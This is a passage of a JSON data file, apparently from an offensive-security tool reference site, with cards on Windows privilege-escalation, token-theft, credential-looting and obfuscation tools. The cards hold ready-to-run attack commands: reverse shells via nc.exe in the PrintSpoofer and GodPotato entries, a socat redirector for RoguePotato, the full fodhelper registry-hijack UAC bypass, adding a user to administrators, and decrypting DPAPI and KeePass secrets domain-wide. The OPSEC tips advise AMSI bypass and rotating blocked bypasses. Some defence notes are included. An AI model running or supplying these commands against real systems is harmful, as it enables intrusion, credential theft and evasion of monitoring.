                "-inputFile <in.ps1> -outputFile <out.exe>",
                "Source script and compiled output"
              ],
              [
                "-x64 / -x86",
                "Target architecture"
              ],
              [
                "-sta / -mta",
                "Apartment threading model"
              ],
              [
                "-noConsole",
                "Build a GUI app with no console window"
              ],
              [
                "-requireAdmin",
                "Embed a UAC manifest requesting elevation"
              ],
              [
                "-icon <f> / -title / -company / -version",
                "Executable metadata"
              ],
              [
                "-credentialGUI",
                "Prompt for credentials via a GUI dialog"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Turn a PowerShell tool into a .NET EXE",
                "cmd": "C:\\Tools\\ps2exe.ps1 -inputFile RACEEx.ps1 -outputFile RACEEx.exe -x64 -sta\n# then run in memory:\nexecute-assembly -p explorer.exe -t 120 '/path/RACEEx.exe'"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Mainly used to wrap a PowerShell-only tool into an EXE so it runs through execute-assembly.",
              "The EXE still hosts PowerShell internally, so AMSI and script-block logging still apply — combine with an AMSI bypass on monitored hosts."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "PS2EXE — GitHub (MScholtes)",
                "url": "https://github.com/MScholtes/PS2EXE"
              }
            ]
          }
        ]
      },
      {
              "id": "winpeas",
              "name": "winPEAS",
              "url": "https://github.com/peass-ng/PEASS-ng",
              "description": "Windows local privilege-escalation enumeration — triages misconfigs that lead to SYSTEM.",
              "brief": "winPEAS (from the PEASS-ng project) is the standard Windows privilege-escalation enumeration script. On a foothold it triages the host for the misconfigurations that lead to SYSTEM: unquoted service paths, weak service and file permissions, AlwaysInstallElevated, autoruns, scheduled tasks, stored credentials, token privileges, and dozens more — colour-coding likely wins.\n\nIt is a first-move tool: run it, read the highlighted findings, then pivot to a targeted exploit (a potato if you hold SeImpersonate, a service hijack, a credential in a config file). It is thorough and therefore noisy on disk/CPU, so on monitored hosts prefer a targeted check or an in-memory runner.",
              "quickReference": [
                      {
                              "label": "Full run (quiet colours)",
                              "cmd": "winPEASx64.exe quiet"
                      },
                      {
                              "label": "Focused: services / creds",
                              "cmd": "winPEASx64.exe quiet servicesinfo\nwinPEASx64.exe quiet filesinfo userinfo"
                      },
                      {
                              "label": "Batch/PS variants",
                              "cmd": "winPEAS.bat        # no binary drop\nInvoke-winPEAS      # PowerShell port"
                      }
              ],
              "sections": [
                      {
                              "title": "Usage",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Enumerate everything",
                                              "cmd": "winPEASx64.exe quiet\n# review red/yellow highlights: SeImpersonate, writable services, AlwaysInstallElevated, saved creds"
                                      },
                                      {
                                              "label": "Targeted modules",
                                              "cmd": "winPEASx64.exe quiet systeminfo userinfo servicesinfo applicationsinfo"
                                      }
                              ]
                      },
                      {
                              "title": "High-value findings it surfaces",
                              "type": "table",
                              "columns": [
                                      "Finding",
                                      "Leads to"
                              ],
                              "rows": [
                                      [
                                              "SeImpersonatePrivilege",
                                              "Potato attack → SYSTEM"
                                      ],
                                      [
                                              "Writable service binary / unquoted path",
                                              "Service hijack → SYSTEM"
                                      ],
                                      [
                                              "AlwaysInstallElevated",
                                              "Malicious MSI → SYSTEM"
                                      ],
                                      [
                                              "Stored credentials (cmdkey, files, registry)",
                                              "Lateral movement / privesc"
                                      ]
                              ]
                      },
                      {
                              "title": "OPSEC",
                              "type": "notes",
                              "items": [
                                      "Thorough and loud — heavy filesystem/registry scanning and a dropped binary. On monitored hosts run a specific check or an in-memory variant instead.",
                                      "Findings feed the privilege-escalation lane of the attack-path map (potatoes, service abuse, UAC bypass)."
                              ]
                      },
                      {
                              "title": "References",
                              "type": "references",
                              "items": [
                                      {
                                              "label": "PEASS-ng — GitHub",
                                              "url": "https://github.com/peass-ng/PEASS-ng"
                                      },
                                      {
                                              "label": "Theory — Windows Access Tokens & UAC",
                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
                                      }
                              ]
                      }
              ]
      },
      {
        "id": "printspoofer",
        "name": "PrintSpoofer",
        "url": "https://github.com/itm4n/PrintSpoofer",
        "description": "SeImpersonate → SYSTEM via the print spooler's named pipe — the modern 'potato'.",
        "brief": "PrintSpoofer escalates a service account that holds SeImpersonatePrivilege to SYSTEM. It coerces the print spooler service to connect to a named pipe the attacker controls, captures the spooler's SYSTEM token as it connects, and impersonates it to spawn a process as SYSTEM. It works on modern Windows where the older RPC/DCOM potatoes were mitigated.\n\nSeImpersonate is held by most service accounts — IIS application pools, MSSQL, and many others — so PrintSpoofer is the standard finisher after landing code execution as such a service. It needs the Spooler service running on the host.",
        "quickReference": [
          {
            "label": "Spawn SYSTEM shell",
            "cmd": "PrintSpoofer.exe -i -c cmd"
          },
          {
            "label": "Run a command",
            "cmd": "PrintSpoofer.exe -c '<payload>'"
          },
          {
            "label": "Check the privilege first",
            "cmd": "whoami /priv | findstr SeImpersonate"
          }
        ],
        "sections": [
          {
            "title": "Flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-i",
                "Interactive — attach the new process to the current console"
              ],
              [
                "-c \"<cmd>\"",
                "Command to run as the resulting SYSTEM context"
              ],
              [
                "-d <sessionId>",
                "Spawn in a specific session (e.g. an RDP session)"
              ],
              [
                "-p <program>",
                "Program to launch (default cmd.exe)"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Confirm the privilege",
                "cmd": "whoami /priv        # need SeImpersonatePrivilege = Enabled/Available"
              },
              {
                "label": "Escalate to SYSTEM",
                "cmd": "PrintSpoofer.exe -i -c cmd.exe         # interactive SYSTEM shell\nPrintSpoofer.exe -c 'nc.exe <ip> <port> -e cmd.exe'   # or run a payload"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Named-pipe coercion to a local listener then a SYSTEM child process is the signal (Sysmon pipe + process events).",
              "Needs the Spooler running. GodPotato / RoguePotato are alternatives when Spooler is disabled or on different builds."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "PrintSpoofer — GitHub (itm4n)",
                "url": "https://github.com/itm4n/PrintSpoofer"
              },
              {
                "label": "Theory — Windows Access Tokens & UAC",
                "url": "theory/2026-08-18-windows-tokens-uac.html"
              }
            ]
          }
        ]
      },
      {
        "id": "godpotato",
        "name": "GodPotato",
        "url": "https://github.com/BeichenDream/GodPotato",
        "description": "SeImpersonate → SYSTEM via a DCOM/RPC token trick that works across modern Windows builds.",
        "brief": "GodPotato is a broadly-compatible member of the 'potato' family: it abuses a DCOM/RPC mechanism to obtain and impersonate a SYSTEM token from a service account holding SeImpersonatePrivilege, spawning a process as SYSTEM. Its selling point is coverage — it works across a wide range of Windows versions where earlier potatoes are patched, and it does not depend on the print spooler.\n\nReach for it when PrintSpoofer fails (Spooler disabled) or the target build is awkward. As with all potatoes, the prerequisite is a token that holds SeImpersonate.",
        "quickReference": [
          {
            "label": "Run a command as SYSTEM",
            "cmd": "GodPotato.exe -cmd 'cmd /c whoami'"
          },
          {
            "label": "Spawn a shell",
            "cmd": "GodPotato.exe -cmd 'cmd /c nc.exe <ip> <port> -e cmd.exe'"
          },
          {
            "label": "Match the build to the host .NET",
            "cmd": "# use GodPotato-NET2 / -NET35 / -NET4 to match the installed framework"
          }
        ],
        "sections": [
          {
            "title": "Flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-cmd \"<command>\"",
                "Command line to run in the elevated context"
              ],
              [
                "-rpc_port <n>",
                "Local RPC port to use (default is chosen automatically)"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Escalate",
                "cmd": "GodPotato.exe -cmd 'cmd /c whoami'      # should print nt authority\\system\nGodPotato.exe -cmd 'cmd /c net localgroup administrators <you> /add'"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Broad Windows coverage and no Spooler dependency. Signal: token manipulation + a SYSTEM child from a service process.",
              "Defence: minimise accounts holding SeImpersonate; run services least-privileged; EDR generally flags known potato binaries."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "GodPotato — GitHub (BeichenDream)",
                "url": "https://github.com/BeichenDream/GodPotato"
              },
              {
                "label": "Theory — Windows Access Tokens & UAC",
                "url": "theory/2026-08-18-windows-tokens-uac.html"
              }
            ]
          }
        ]
      },
      {
        "id": "roguepotato",
        "name": "RoguePotato",
        "url": "https://github.com/antonioCoco/RoguePotato",
        "description": "SeImpersonate → SYSTEM via a redirected OXID resolver — the JuicyPotato successor.",
        "brief": "RoguePotato is the successor to JuicyPotato for builds where Microsoft mitigated the original. It abuses DCOM/NTLM by redirecting the OXID resolver through an attacker-controlled RPC endpoint on port 135, recovering a SYSTEM token from a SeImpersonate-holding service account and impersonating it to run code as SYSTEM.\n\nIt typically needs a socat/network redirector so the OXID resolution reaches your fake resolver. Like the other potatoes, the prerequisite is SeImpersonatePrivilege; pick whichever potato works on the target's build.",
        "quickReference": [
          {
            "label": "Run as SYSTEM",
            "cmd": "RoguePotato.exe -r <redirector_ip> -e '<payload>' -l 9999"
          },
          {
            "label": "Redirector (on your host)",
            "cmd": "socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999"
          },
          {
            "label": "Needs a redirector for port 135",
            "cmd": "# RoguePotato relays the OXID resolver via your -r host back to -l"
          }
        ],
        "sections": [
          {
            "title": "Flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-r <ip>",
                "Attacker OXID resolver / redirector IP"
              ],
              [
                "-e \"<cmd>\"",
                "Command to execute in the elevated context"
              ],
              [
                "-l <port>",
                "Local port the fake OXID resolver listens on"
              ],
              [
                "-c <CLSID>",
                "DCOM CLSID to trigger"
              ],
              [
                "-p <pipe>",
                "Named pipe to use"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Set up the redirector and escalate",
                "cmd": "# on the attacker host:\nsocat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999\n# on the target (SeImpersonate service):\nRoguePotato.exe -r <attacker_ip> -e 'C:\\\\Windows\\\\System32\\\\cmd.exe' -l 9999"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Requires port-135 redirection to your fake OXID resolver. Signal: DCOM/RPC anomalies + SYSTEM child process.",
              "Try PrintSpoofer/GodPotato first — they need less setup; RoguePotato is the fallback for certain builds."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "RoguePotato — GitHub (antonioCoco)",
                "url": "https://github.com/antonioCoco/RoguePotato"
              },
              {
                "label": "Theory — Windows Access Tokens & UAC",
                "url": "theory/2026-08-18-windows-tokens-uac.html"
              }
            ]
          }
        ]
      },
      {
        "id": "fodhelper",
        "name": "Fodhelper UAC bypass",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/",
        "description": "A LOLBin UAC bypass — auto-elevating binary that runs your command at high integrity via HKCU.",
        "brief": "fodhelper.exe is a Windows 'Features on Demand' helper that auto-elevates (its manifest allows it to run high-integrity without a UAC prompt). It also reads a per-user registry key when launched. By planting a command under HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command and running fodhelper, an administrator running at medium integrity gets their payload executed at high integrity — a classic fileless UAC bypass using only built-in binaries.\n\nIt is not a privilege escalation across users — you must already be in the local Administrators group but running unelevated (the usual state after phishing an admin). It is the prerequisite step before credential dumping, which needs high integrity.",
        "quickReference": [
          {
            "label": "Plant the hijack + trigger",
            "cmd": "reg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /d '<payload>' /f\nreg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /v DelegateExecute /f\nfodhelper.exe"
          },
          {
            "label": "Clean up",
            "cmd": "reg delete 'HKCU\\Software\\Classes\\ms-settings' /f"
          },
          {
            "label": "Same idea, different binary",
            "cmd": "# computerdefaults.exe reads the same ms-settings handler as fodhelper"
          }
        ],
        "sections": [
          {
            "title": "Related auto-elevating LOLBins",
            "type": "table",
            "columns": [
              "Binary",
              "Handler it reads from HKCU"
            ],
            "rows": [
              [
                "fodhelper.exe",
                "ms-settings shell\\open\\command (the common one)"
              ],
              [
                "computerdefaults.exe",
                "Also the ms-settings handler"
              ],
              [
                "sdclt.exe",
                "App Paths / IsolatedCommand"
              ],
              [
                "slui.exe",
                ".exe / URL handler hijack"
              ],
              [
                "eventvwr.exe",
                "mscfile handler (patched on modern Windows)"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Full bypass",
                "cmd": "reg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /ve /d 'cmd.exe /c <payload>' /f\nreg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /v 'DelegateExecute' /f\nfodhelper.exe        # spawns the payload high-integrity, no UAC prompt\nreg delete 'HKCU\\Software\\Classes\\ms-settings' /f   # cleanup"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Signal: auto-elevating binaries (fodhelper/computerdefaults/wsreset) spawning odd children; HKCU ms-settings class writes.",
              "Defence: set UAC to 'always notify'; monitor the known hijack registry paths. Many bypasses exist — wsreset, computerdefaults, sdclt — rotate if one is blocked."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "LOLBAS — Fodhelper",
                "url": "https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/"
              },
              {
                "label": "Theory — Windows Access Tokens & UAC",
                "url": "theory/2026-08-18-windows-tokens-uac.html"
              }
            ]
          }
        ]
      },
      {
        "id": "incognito",
        "name": "Incognito",
        "url": "https://github.com/CyberVaca/incognito",
        "description": "Token impersonation — steal and reuse a privileged token already present on the host.",
        "brief": "Incognito enumerates the access tokens present on a compromised host and lets you impersonate them. When a privileged user (a Domain Admin, a service account) has logged on or has a process running, their token is available in memory; if you are SYSTEM/high-integrity you can duplicate and assume it to act as that user — without their password or hash.\n\nIt is the classic 'hunt a DA session then steal their token' finisher: list delegation tokens, find a privileged one, impersonate it, and use the borrowed identity to move laterally or reach the DC. It ships standalone and as a Meterpreter extension.",
        "quickReference": [
          {
            "label": "List available tokens",
            "cmd": "incognito.exe list_tokens -u"
          },
          {
            "label": "Impersonate a token",
            "cmd": "incognito.exe execute -c '<DOMAIN>\\<user>' cmd.exe"
          },
          {
            "label": "In Meterpreter",
            "cmd": "load incognito ; list_tokens -u ; impersonate_token '<DOMAIN>\\\\<user>'"
          }
        ],
        "sections": [
          {
            "title": "Commands",
            "type": "table",
            "columns": [
              "Command",
              "Description"
            ],
            "rows": [
              [
                "list_tokens -u",
                "List available tokens grouped by user (-g groups by group)"
              ],
              [
                "execute -c \"<DOMAIN\\user>\" <cmd>",
                "Impersonate the named token and run a command"
              ],
              [
                "add_user <user> <pass>",
                "Create a user (needs the rights of an impersonated token)"
              ],
              [
                "add_localgroup_user <group> <user>",
                "Add a user to a local group"
              ],
              [
                "snarf_hashes",
                "Collect hashes from the tokens available on the host"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Find and assume a privileged token",
                "cmd": "incognito.exe list_tokens -u                       # enumerate by user\nincognito.exe execute -c '<DOMAIN>\\Administrator' cmd.exe"
              },
              {
                "label": "Meterpreter workflow",
                "cmd": "meterpreter > load incognito\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token '<DOMAIN>\\\\<da_user>'"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Requires SYSTEM/high integrity and a privileged token present on the box — pair with 'hunt for a DA session'.",
              "Signal: token manipulation and cross-session process access. Defence: tiered admin (DAs never log on to lower-tier hosts), credential guard."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Incognito — GitHub",
                "url": "https://github.com/CyberVaca/incognito"
              },
              {
                "label": "Theory — Windows Access Tokens & UAC",
                "url": "theory/2026-08-18-windows-tokens-uac.html"
              }
            ]
          }
        ]
      },
      {
        "id": "sharpdpapi",
        "name": "SharpDPAPI",
        "url": "https://github.com/GhostPack/SharpDPAPI",
        "description": "Decrypts DPAPI-protected secrets — browser passwords, RDP, Wi-Fi, credentials and vaults.",
        "brief": "SharpDPAPI is the C# tool for looting secrets protected by Windows' Data Protection API (DPAPI). Windows encrypts a lot of user secrets — saved browser and RDP passwords, Wi-Fi keys, Credential Manager entries, scheduled-task credentials — with per-user DPAPI master keys. SharpDPAPI triages and decrypts them, either with the user's password/hash, from SYSTEM, or with the domain DPAPI backup key.\n\nThe domain backup key is the crown jewel: a Domain Admin can extract it once and then decrypt any user's DPAPI secrets across the domain, offline. SharpDPAPI (and its Python cousin DonPAPI) turn a foothold into a rich set of reusable credentials.",
        "quickReference": [
          {
            "label": "Triage current user's secrets",
            "cmd": "SharpDPAPI.exe triage"
          },
          {
            "label": "Decrypt with the domain backup key",
            "cmd": "SharpDPAPI.exe masterkeys /pvk:<domain_backupkey.pvk>"
          },
          {
            "label": "Credentials / vaults",
            "cmd": "SharpDPAPI.exe credentials\nSharpDPAPI.exe vaults"
          }
        ],
        "sections": [
          {
            "title": "Commands & flags",
            "type": "table",
            "columns": [
              "Command",
              "What it decrypts / does"
            ],
            "rows": [
              [
                "triage",
                "All reachable secrets for the current user, in one pass"
              ],
              [
                "machinetriage",
                "Machine-scope secrets (run as SYSTEM)"
              ],
              [
                "masterkeys [/pvk:<key>]",
                "User masterkeys; with the domain backup key, any user"
              ],
              [
                "credentials / vaults",
                "Credential Manager blobs and the Windows Vault"
              ],
              [
                "rdg",
                "Saved Remote Desktop (.rdg) credentials"
              ],
              [
                "keepass",
                "KeePass key material from the config/process"
              ],
              [
                "certificates [/machine]",
                "Exportable certificates and their private keys"
              ],
              [
                "backupkey /server:<dc>",
                "Retrieve the domain DPAPI backup key (needs DA)"
              ],
              [
                "/password: /server: /target: /ntlm:",
                "Common qualifiers for scope and auth"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Triage everything for the current user",
                "cmd": "SharpDPAPI.exe triage        # browsers, creds, vaults, RDP, etc."
              },
              {
                "label": "Domain-wide with the backup key",
                "cmd": "# extract the backup key once as DA (mimikatz lsadump::backupkeys or SharpDPAPI backupkey), then:\nSharpDPAPI.exe masterkeys /pvk:key.pvk\nSharpDPAPI.exe credentials /pvk:key.pvk"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Access to masterkey files and the domain backup key is the signal. The backup key is the highest-value: guard it and rotate after DA compromise.",
              "DonPAPI automates the same across many hosts from Linux — see the Credential Storage theory page."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "SharpDPAPI — GitHub (GhostPack)",
                "url": "https://github.com/GhostPack/SharpDPAPI"
              },
              {
                "label": "Theory — Windows Credential Storage",
                "url": "theory/2026-08-18-windows-credential-storage.html"
              }
            ]
          }
        ]
      },
      {
        "id": "keethief",
        "name": "KeeThief",
        "url": "https://github.com/GhostPack/KeeThief",
        "description": "Extracts KeePass master-key material from a running KeePass process to open the database.",
        "brief": "KeeThief extracts the key material of an unlocked KeePass database from the memory of a running KeePass process. Password managers are a jackpot on a workstation — one database often holds domain, service and privileged credentials — but they are encrypted at rest. KeeThief sidesteps that by pulling the composite master key from the live process, letting you decrypt the .kdbx.\n\nIt targets KeePass specifically (a very common enterprise choice). Related tricks include a malicious KeePass trigger/plugin for persistence, and CVE-2023-32784 to recover the master password from a process dump. Whichever route, the payoff is a trove of reusable credentials.",
        "quickReference": [
          {
            "label": "Extract keys from running KeePass",
            "cmd": "KeeThief.exe"
          },
          {
            "label": "PowerShell variant",
            "cmd": "Get-KeePassDatabaseKey"
          },
          {
            "label": "Find KeePass first",
            "cmd": "tasklist | findstr /I keepass"
          }
        ],
        "sections": [
          {
            "title": "Usage",
            "type": "table",
            "columns": [
              "Step",
              "Command"
            ],
            "rows": [
              [
                "Confirm KeePass is running",
                "tasklist | findstr /I keepass"
              ],
              [
                "Extract the key material",
                "KeeThief.exe"
              ],
              [
                "PowerShell variant",
                "Get-KeePassDatabaseKey"
              ],
              [
                "Then open the database",
                "Use the recovered key parts (master password / keyfile / Windows-account) to open the .kdbx"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Pull the master key from memory",
                "cmd": "KeeThief.exe        # locates KeePass, extracts the composite key -> decrypt the .kdbx offline"
              },
              {
                "label": "Alternatives",
                "cmd": "# CVE-2023-32784: recover the master password from a KeePass process/minidump\n# or drop a malicious KeePass trigger to exfil entries on next unlock"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Requires the database to be unlocked (process running) or a process dump. Signal: process access to KeePass, unusual minidumps, new triggers/plugins.",
              "Defence: lock the DB when idle, use a key file / Windows Hello, and restrict local admin so memory access is harder."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "KeeThief — GitHub (GhostPack)",
                "url": "https://github.com/GhostPack/KeeThief"
              },
              {
                "label": "Theory — Windows Credential Storage",
                "url": "theory/2026-08-18-windows-credential-storage.html"
              }
            ]
          }
        ]
      }
    ]
  },
  {
    "category": "Evasion & Obfuscation",
    "tools": [
      {
        "id": "obfuscar",
        "name": "Obfuscar",
        "url": "https://github.com/obfuscar/obfuscar",
        "description": "Minimalistic open-source (MIT) obfuscator for .NET assemblies — renames metadata and hides string literals in a compiled C#/VB/F# DLL or EXE.",
        "brief": "Obfuscar is a small, open-source (MIT) obfuscator for .NET. It works on the *compiled* assembly — the IL and metadata in your C#/VB/F# .dll or .exe — not the source, so it slots in as a post-build step. It renames namespaces, types, methods, fields, properties and events to short, often unprintable names, hides string literals behind a runtime decryptor, and writes a mapping file so you can still read your own stack traces.\n\nIt is deliberately minimalistic: it does metadata renaming and string hiding well and leaves control-flow flattening and anti-debug tricks to heavier tools. By default it keeps the public API (so a library stays usable) and obfuscates everything non-public.\n\nScope: Obfuscar only understands managed .NET assemblies. Native C/C++ compiled to machine code has no .NET metadata to rename, so Obfuscar does not apply to it (see the note below). It is maintained by LeXtudio Inc. and ships as two NuGet packages: Obfuscar.GlobalTool (a dotnet global tool for modern .NET) and Obfuscar (for .NET Framework).",
        "quickReference": [
          {
            "label": "Install as a .NET global tool",
            "cmd": "dotnet tool install --global Obfuscar.GlobalTool"
          },
          {
            "label": "Run against a project file",
            "cmd": "obfuscar.console obfuscar.xml"
          },
          {
            "label": "Minimal project file (paths must be absolute)",
            "cmd": "<Obfuscator>\n  <Var name=\"InPath\"  value=\"C:\\src\\MyApp\\bin\\Release\\net8.0\" />\n  <Var name=\"OutPath\" value=\"C:\\src\\MyApp\\bin\\Obfuscated\" />\n  <Module file=\"C:\\src\\MyApp\\bin\\Release\\net8.0\\MyApp.dll\" />\n</Obfuscator>"
          },
          {
            "label": "Detailed log of every rename",
            "cmd": "obfuscar.console -v:d obfuscar.xml"
          }
        ],
        "sections": [
          {
            "title": "How it works",
            "type": "notes",
            "items": [
              "Obfuscar reads the compiled assembly's metadata and IL (via System.Reflection.Metadata / PEReader) — not your source. You build the project normally, then Obfuscar rewrites the output assembly into OutPath.",
              "Renaming: namespaces, types, methods, fields, properties and events get new short names (reused across unrelated scopes when ReuseNames is on). Overloads, overrides and interface/virtual methods are kept consistent so the assembly still runs.",
              "String hiding (HideStrings, on by default): string literals are moved into an encrypted blob and decrypted at runtime by an injected method, so you can't just pull text out of the binary with 'strings' or a decompiler's string view.",
              "Public surface: KeepPublicApi (default true) leaves public types/members named so a library keeps its API; HidePrivateApi (default true) renames everything non-public. For a self-contained EXE where nothing external calls in, set KeepPublicApi=false to rename the public API too.",
              "Extras: OptimizeMethods tidies the IL, SuppressIldasm injects SuppressIldasmAttribute, and a Mapping.txt (or Mapping.xml when XmlMapping=true) records every old → new name so you can de-obfuscate your own crash reports.",
              "It is not a packer or a control-flow obfuscator — the logic is still there, just hard to read. Treat it as raising the cost of casual reverse engineering, not as a security boundary."
            ]
          },
          {
            "title": "Install",
            "type": "commands",
            "commands": [
              {
                "label": "Modern .NET (recommended) — global tool",
                "cmd": "dotnet tool install --global Obfuscar.GlobalTool\n# installs the 'obfuscar.console' command on PATH\nobfuscar.console --version"
              },
              {
                "label": "Local tool (pinned per-repo)",
                "cmd": "dotnet new tool-manifest              # once per repo -> .config/dotnet-tools.json\ndotnet tool install Obfuscar.GlobalTool\ndotnet tool run obfuscar.console obfuscar.xml"
              },
              {
                "label": ".NET Framework (classic package)",
                "cmd": "# the 'Obfuscar' package ships Obfuscar.Console.exe under its tools folder\nnuget install Obfuscar              # or add a PackageReference to Obfuscar\npackages\\Obfuscar.<version>\\tools\\Obfuscar.Console.exe obfuscar.xml"
              }
            ]
          },
          {
            "title": "Run it (CLI)",
            "type": "commands",
            "commands": [
              {
                "label": "Usage",
                "cmd": "obfuscar.console [options] <project_file> [project_file ...]\n#   -v:<level>, --verbosity:<level>   q(uiet) | m(inimal) | n(ormal) | d(etailed) | diag(nostic)\n#   -V, --version                     print version\n#   -h, --help                        show help"
              },
              {
                "label": "Typical",
                "cmd": "obfuscar.console obfuscar.xml           # obfuscate per the project file\nobfuscar.console -v:d obfuscar.xml      # detailed log of every rename"
              }
            ]
          },
          {
            "title": "The project file (obfuscar.xml)",
            "type": "commands",
            "commands": [
              {
                "label": "A realistic config",
                "cmd": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Obfuscator>\n  <!-- In current Obfuscar these paths must be ABSOLUTE -->\n  <Var name=\"InPath\"  value=\"C:\\src\\MyApp\\bin\\Release\\net8.0\" />\n  <Var name=\"OutPath\" value=\"C:\\src\\MyApp\\bin\\Obfuscated\" />\n\n  <!-- global behaviour (values shown are the defaults unless noted) -->\n  <Var name=\"KeepPublicApi\"   value=\"false\" />   <!-- rename the public API too (good for an EXE) -->\n  <Var name=\"HidePrivateApi\"  value=\"true\" />\n  <Var name=\"HideStrings\"     value=\"true\" />\n  <Var name=\"RenameProperties\" value=\"true\" />\n  <Var name=\"RenameEvents\"     value=\"true\" />\n  <Var name=\"OptimizeMethods\"  value=\"true\" />\n  <Var name=\"SuppressIldasm\"   value=\"true\" />\n  <Var name=\"XmlMapping\"       value=\"false\" />  <!-- Mapping.txt vs Mapping.xml -->\n\n  <!-- resolve dependencies from here if they are not beside the module -->\n  <AssemblySearchPath path=\"C:\\src\\MyApp\\bin\\Release\\net8.0\" />\n\n  <!-- the assembly to process (absolute path) -->\n  <Module file=\"C:\\src\\MyApp\\bin\\Release\\net8.0\\MyApp.dll\" />\n\n  <!-- keep names that reflection / serialization look up at runtime -->\n  <SkipNamespace name=\"MyApp.Models\" />\n  <SkipType name=\"MyApp.Plugins.IPlugin\" />\n  <SkipProperty type=\"MyApp.Config\" name=\"*\" />\n</Obfuscator>"
              },
              {
                "label": "Top-level elements",
                "cmd": "# <Var name= value= />        a setting (see the configuration reference below)\n# <Module file= />            an assembly to obfuscate (absolute path; repeatable)\n# <AssemblySearchPath path= />  extra folder(s) to resolve referenced assemblies\n# <Include path= />           pull in another .xml config fragment (absolute path)\n# <Skip* ... /> / <ForceType>   exclusion / inclusion rules (see exclusions table)"
              }
            ]
          },
          {
            "title": "Configuration reference — every setting",
            "type": "table",
            "columns": [
              "<Var> name",
              "Default",
              "What it does"
            ],
            "rows": [
              [
                "InPath",
                ".",
                "Folder holding the built assemblies; must exist. Obfuscar reads inputs and resolves dependencies from here."
              ],
              [
                "OutPath",
                ".",
                "Folder for the obfuscated output and the Mapping file."
              ],
              [
                "LogFile",
                "(empty)",
                "Write the obfuscation log to this file as well as the console."
              ],
              [
                "KeepPublicApi",
                "true",
                "Leave public types/members named (library-safe). Set false to rename the public API too (self-contained EXE)."
              ],
              [
                "HidePrivateApi",
                "true",
                "Rename non-public types/members."
              ],
              [
                "RenameFields",
                "true",
                "Rename fields."
              ],
              [
                "RenameProperties",
                "true",
                "Rename properties."
              ],
              [
                "KeepProperties",
                "false",
                "Keep property names even when renaming is on (overrides RenameProperties) — useful for binding/serialization."
              ],
              [
                "RenameEvents",
                "true",
                "Rename events."
              ],
              [
                "HideStrings",
                "true",
                "Move string literals into an encrypted blob, decrypted at runtime by an injected method."
              ],
              [
                "OptimizeMethods",
                "true",
                "Run an IL optimisation pass on obfuscated methods."
              ],
              [
                "SuppressIldasm",
                "true",
                "Add SuppressIldasmAttribute to deter ildasm.exe."
              ],
              [
                "ReuseNames",
                "true",
                "Reuse the same short names across unrelated scopes (smaller output, more confusing to read)."
              ],
              [
                "UseUnicodeNames",
                "false",
                "Use unprintable Unicode characters for new names."
              ],
              [
                "UseKoreanNames",
                "false",
                "Use Korean glyphs for new names."
              ],
              [
                "CustomChars",
                "(empty)",
                "Supply your own character set to draw new names from."
              ],
              [
                "MarkedOnly",
                "false",
                "Invert the model: obfuscate ONLY members marked with [Obfuscation], leave everything else."
              ],
              [
                "XmlMapping",
                "false",
                "Write the name map as Mapping.xml instead of Mapping.txt."
              ],
              [
                "RegenerateDebugInfo",
                "false",
                "Regenerate PDB debug symbols for the obfuscated output."
              ],
              [
                "AnalyzeXaml",
                "false",
                "Scan XAML (WPF) and avoid renaming members it references by name."
              ],
              [
                "SkipGenerated",
                "false",
                "Skip compiler-generated members."
              ],
              [
                "SkipSpecialName",
                "false",
                "Skip special-name members (e.g. property/event accessors, operators)."
              ],
              [
                "CustomAttributesToPreservePropertyNames",
                "(empty)",
                "Attributes whose decorated properties keep their names (e.g. serializer attributes)."
              ]
            ]
          },
          {
            "title": "Keeping code from breaking — exclusions",
            "type": "table",
